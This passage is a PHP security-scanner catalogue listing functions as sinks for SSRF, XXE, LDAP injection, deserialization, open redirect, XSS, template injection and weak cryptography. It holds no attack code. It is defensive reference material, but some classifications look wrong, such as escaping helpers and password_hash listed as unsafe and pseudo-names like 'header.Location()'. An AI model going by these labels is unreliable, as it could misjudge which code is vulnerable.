- `socket_connect()` — socket_connect ssrf / protocol injection / outbound network
- `socket_send()` — socket_send ssrf / protocol injection / outbound network
- `socket_write()` — socket_write ssrf / protocol injection / outbound network
- `ldap_connect()` — ldap_connect ssrf / protocol injection / outbound network
- `msession_connect()` — msession_connect ssrf / protocol injection / outbound network
- `imap_mail()` — imap_mail ssrf / protocol injection / outbound network
- `ftp_chmod()` — ftp_chmod ssrf / protocol injection / outbound network
- `ftp_exec()` — ftp_exec ssrf / protocol injection / outbound network
- `ftp_delete()` — ftp_delete ssrf / protocol injection / outbound network
- `ftp_fget()` — ftp_fget ssrf / protocol injection / outbound network
- `ftp_nlist()` — ftp_nlist ssrf / protocol injection / outbound network
- `ftp_nb_fget()` — ftp_nb_fget ssrf / protocol injection / outbound network
- `printer_open()` — printer_open ssrf / protocol injection / outbound network
- `SoapClient::__construct()` — SoapClient::__construct ssrf / protocol injection / outbound network
- `SoapClient::__soapCall()` — SoapClient::__soapCall ssrf / protocol injection / outbound network
- `xmlrpc_encode_request()` — xmlrpc_encode_request ssrf / protocol injection / outbound network
- `xmlrpc_decode_request()` — xmlrpc_decode_request ssrf / protocol injection / outbound network
- `stream_context_create()` — stream_context_create ssrf / protocol injection / outbound network
- `stream_context_set_option()` — stream_context_set_option ssrf / protocol injection / outbound network
- `stream_wrapper_register()` — stream_wrapper_register ssrf / protocol injection / outbound network

- `wp_remote_get()` (wordpress) — wp_remote_get wordpress url/output/http sink
- `wp_remote_post()` (wordpress) — wp_remote_post wordpress url/output/http sink
- `wp_remote_request()` (wordpress) — wp_remote_request wordpress url/output/http sink
- `Requests::request()` (wordpress) — Requests::request wordpress url/output/http sink
- `Requests::get()` (wordpress) — Requests::get wordpress url/output/http sink
- `Requests::post()` (wordpress) — Requests::post wordpress url/output/http sink
- `Illuminate\Support\Facades\Http::get()` (php) — Illuminate\Support\Facades\Http::get framework outbound http / ssrf
- `Illuminate\Support\Facades\Http::post()` (php) — Illuminate\Support\Facades\Http::post framework outbound http / ssrf
- `GuzzleHttp\Client::request()` (php) — GuzzleHttp\Client::request framework outbound http / ssrf
- `GuzzleHttp\Client::get()` (php) — GuzzleHttp\Client::get framework outbound http / ssrf
- `GuzzleHttp\Client::post()` (php) — GuzzleHttp\Client::post framework outbound http / ssrf

### XXE / XML Processing Sinks

- `DOMDocument::loadHTML()` — DOMDocument::loadHTML xml/xxe/xslt external entity or transform
- `DOMDocument::loadHTMLFile()` — DOMDocument::loadHTMLFile xml/xxe/xslt external entity or transform
- `DOMDocument::schemaValidate()` — DOMDocument::schemaValidate xml/xxe/xslt external entity or transform
- `DOMDocument::schemaValidateSource()` — DOMDocument::schemaValidateSource xml/xxe/xslt external entity or transform
- `DOMDocument::relaxNGValidate()` — DOMDocument::relaxNGValidate xml/xxe/xslt external entity or transform
- `DOMDocument::relaxNGValidateSource()` — DOMDocument::relaxNGValidateSource xml/xxe/xslt external entity or transform
- `xml_parse()` — xml_parse xml/xxe/xslt external entity or transform
- `xml_parse_into_struct()` — xml_parse_into_struct xml/xxe/xslt external entity or transform
- `XMLReader::open()` — XMLReader::open xml/xxe/xslt external entity or transform
- `xml_parser_create_ns()` — xml_parser_create_ns xml/xxe/xslt external entity or transform
- `libxml_set_external_entity_loader()` — libxml_set_external_entity_loader xml/xxe/xslt external entity or transform
- `XSLTProcessor::importStylesheet()` — XSLTProcessor::importStylesheet xml/xxe/xslt external entity or transform
- `XSLTProcessor::transformToXML()` — XSLTProcessor::transformToXML xml/xxe/xslt external entity or transform
- `XSLTProcessor::transformToDoc()` — XSLTProcessor::transformToDoc xml/xxe/xslt external entity or transform
- `XSLTProcessor::transformToURI()` — XSLTProcessor::transformToURI xml/xxe/xslt external entity or transform

### LDAP Injection Sinks

- `ldap_add()` — ldap_add ldap query / dn manipulation
- `ldap_delete()` — ldap_delete ldap query / dn manipulation
- `ldap_list()` — ldap_list ldap query / dn manipulation
- `ldap_read()` — ldap_read ldap query / dn manipulation
- `ldap_search()` — ldap_search ldap query / dn manipulation
- `ldap_modify()` — ldap_modify ldap query / dn manipulation
- `ldap_mod_add()` — ldap_mod_add ldap query / dn manipulation
- `ldap_mod_del()` — ldap_mod_del ldap query / dn manipulation
- `ldap_mod_replace()` — ldap_mod_replace ldap query / dn manipulation
- `ldap_rename()` — ldap_rename ldap query / dn manipulation

### Deserialization Sinks

- `yaml_parse()` — yaml_parse php object injection / deserialization
- `yaml_parse_file()` — yaml_parse_file php object injection / deserialization
- `yaml_parse_url()` — yaml_parse_url php object injection / deserialization
- `igbinary_unserialize()` — igbinary_unserialize php object injection / deserialization
- `msgpack_unpack()` — msgpack_unpack php object injection / deserialization
- `session_decode()` — session_decode php object injection / deserialization
- `wddx_deserialize()` — wddx_deserialize php object injection / deserialization
- `phar.read_metadata()` — phar.read_metadata php object injection / deserialization

### Archive / Phar Traversal Sinks

- `ZipArchive::open()` — ZipArchive::open archive traversal / phar metadata touchpoint
- `ZipArchive::addFile()` — ZipArchive::addFile archive traversal / phar metadata touchpoint
- `ZipArchive::addFromString()` — ZipArchive::addFromString archive traversal / phar metadata touchpoint
- `PharData::compress()` — PharData::compress archive traversal / phar metadata touchpoint
- `PharData::decompress()` — PharData::decompress archive traversal / phar metadata touchpoint
- `Phar::webPhar()` — Phar::webPhar archive traversal / phar metadata touchpoint
- `Phar::mapPhar()` — Phar::mapPhar archive traversal / phar metadata touchpoint
- `Phar::loadPhar()` — Phar::loadPhar archive traversal / phar metadata touchpoint
- `RarArchive::open()` — RarArchive::open archive traversal / phar metadata touchpoint
- `RarEntry::extract()` — RarEntry::extract archive traversal / phar metadata touchpoint

### Open Redirect Sinks


- `header.Location()` (php) — header.Location open redirect / unsafe location header
- `http_redirect()` (php) — http_redirect open redirect / unsafe location header
- `Symfony\Component\HttpFoundation\RedirectResponse::__construct()` (php) — Symfony\Component\HttpFoundation\RedirectResponse::__construct open redirect / unsafe location header
- `Illuminate\Http\RedirectResponse::__construct()` (php) — Illuminate\Http\RedirectResponse::__construct open redirect / unsafe location header
- `response()->redirectTo()` (php) — response()->redirectTo open redirect / unsafe location header
- `redirect()->to()` (php) — redirect()->to open redirect / unsafe location header
- `redirect()->away()` (php) — redirect()->away open redirect / unsafe location header
- `redirect()->route()` (php) — redirect()->route open redirect / unsafe location header
- `wp_redirect()` (php) — wp_redirect open redirect / unsafe location header
- `wp_safe_redirect()` (php) — wp_safe_redirect open redirect / unsafe location header
- `drupal_redirect_form()` (php) — drupal_redirect_form open redirect / unsafe location header

### HTTP Header / Response Sinks

- `headers_list()` — headers_list http header / response splitting
- `http_response_code()` — http_response_code http header / response splitting

### XSS / Output Rendering Sinks

- `print()` — print cross-site scripting / output rendering
- `print_r()` — print_r cross-site scripting / output rendering
- `var_dump()` — var_dump cross-site scripting / output rendering
- `var_export()` — var_export cross-site scripting / output rendering
- `debug_zval_dump()` — debug_zval_dump cross-site scripting / output rendering
- `printf()` — printf cross-site scripting / output rendering
- `vprintf()` — vprintf cross-site scripting / output rendering
- `trigger_error()` — trigger_error cross-site scripting / output rendering
- `user_error()` — user_error cross-site scripting / output rendering
- `odbc_result_all()` — odbc_result_all cross-site scripting / output rendering
- `ovrimos_result_all()` — ovrimos_result_all cross-site scripting / output rendering
- `ifx_htmltbl_result()` — ifx_htmltbl_result cross-site scripting / output rendering

### Framework XSS / Output Rendering Sinks


- `Symfony\Component\HttpFoundation\Response::__construct()` (php) — Symfony\Component\HttpFoundation\Response::__construct framework output/template rendering
- `Symfony\Component\HttpFoundation\Response::setContent()` (php) — Symfony\Component\HttpFoundation\Response::setContent framework output/template rendering
- `Symfony\Component\HttpFoundation\JsonResponse::setData()` (php) — Symfony\Component\HttpFoundation\JsonResponse::setData framework output/template rendering
- `Illuminate\Http\Response::setContent()` (php) — Illuminate\Http\Response::setContent framework output/template rendering
- `response()->make()` (php) — response()->make framework output/template rendering
- `view()` (php) — view framework output/template rendering
- `Illuminate\Support\HtmlString::__construct()` (php) — Illuminate\Support\HtmlString::__construct framework output/template rendering
- `Twig\Environment::render()` (php) — Twig\Environment::render framework output/template rendering
- `Twig\Environment::display()` (php) — Twig\Environment::display framework output/template rendering
- `Twig\Markup::__construct()` (php) — Twig\Markup::__construct framework output/template rendering
- `Smarty::display()` (php) — Smarty::display framework output/template rendering
- `Smarty::fetch()` (php) — Smarty::fetch framework output/template rendering
- `Smarty::assign()` (php) — Smarty::assign framework output/template rendering
- `Latte\Engine::renderToString()` (php) — Latte\Engine::renderToString framework output/template rendering
- `Plates\Engine::render()` (php) — Plates\Engine::render framework output/template rendering
- `esc_html__()` (php) — esc_html__ framework output/template rendering
- `esc_attr__()` (php) — esc_attr__ framework output/template rendering
- `wp_kses_post()` (php) — wp_kses_post framework output/template rendering
- `wp_send_json()` (php) — wp_send_json framework output/template rendering
- `wp_die()` (php) — wp_die framework output/template rendering
- `drupal_set_message()` (php) — drupal_set_message framework output/template rendering
- `drupal_render()` (php) — drupal_render framework output/template rendering
- `wp_send_json_success()` (wordpress) — wp_send_json_success wordpress url/output/http sink
- `wp_send_json_error()` (wordpress) — wp_send_json_error wordpress url/output/http sink
- `wp_send_jsonp()` (wordpress) — wp_send_jsonp wordpress url/output/http sink

### Template Injection / SSTI Sinks


- `Blade::render()` (php) — Blade::render framework output/template rendering
- `Twig\Environment::createTemplate()` (php) — Twig\Environment::createTemplate framework output/template rendering

### Weak Cryptography / Hashing Sinks

- `crc32()` — crc32 weak crypto / unsafe primitive or parameter
- `crypt()` — crypt weak crypto / unsafe primitive or parameter
- `hash_pbkdf2()` — hash_pbkdf2 weak crypto / unsafe primitive or parameter
- `mcrypt_encrypt()` — mcrypt_encrypt weak crypto / unsafe primitive or parameter
- `mcrypt_decrypt()` — mcrypt_decrypt weak crypto / unsafe primitive or parameter
- `mcrypt_create_iv()` — mcrypt_create_iv weak crypto / unsafe primitive or parameter
- `openssl_encrypt()` — openssl_encrypt weak crypto / unsafe primitive or parameter
- `openssl_decrypt()` — openssl_decrypt weak crypto / unsafe primitive or parameter
- `openssl_public_encrypt()` — openssl_public_encrypt weak crypto / unsafe primitive or parameter
- `openssl_private_decrypt()` — openssl_private_decrypt weak crypto / unsafe primitive or parameter
- `openssl_sign()` — openssl_sign weak crypto / unsafe primitive or parameter
- `openssl_verify()` — openssl_verify weak crypto / unsafe primitive or parameter
- `openssl_digest()` — openssl_digest weak crypto / unsafe primitive or parameter
- `sodium_crypto_pwhash()` — sodium_crypto_pwhash weak crypto / unsafe primitive or parameter
- `password_hash()` — password_hash weak crypto / unsafe primitive or parameter
